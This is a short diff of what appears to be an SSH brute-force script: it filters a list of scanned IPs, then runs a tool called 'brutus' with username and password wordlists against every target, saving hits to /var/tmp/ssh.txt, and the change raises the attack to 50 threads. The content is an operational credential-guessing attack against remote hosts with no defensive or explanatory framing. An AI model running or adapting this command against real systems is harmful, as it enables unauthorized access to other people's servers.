@@ -43,7 +43,7 @@ grep -v "^127\." ips_nabu >  my_ips
 
 
 
-./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q     >     /var/tmp/ssh.txt  
+./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q  -t 50     >     /var/tmp/ssh.txt  
  
 
 
